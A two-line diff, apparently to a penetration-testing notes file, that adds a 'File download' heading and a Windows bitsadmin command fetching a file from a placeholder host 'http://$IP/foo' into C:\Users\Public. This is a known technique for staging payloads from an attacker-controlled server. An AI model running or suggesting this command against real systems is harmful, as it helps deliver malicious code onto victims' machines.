@@ -1,1 +1,2 @@
-./bitsadmin
+# File download
+bitsadmin /transfer j1 /download /priority normal http://$IP/foo C:\Users\Public\foo
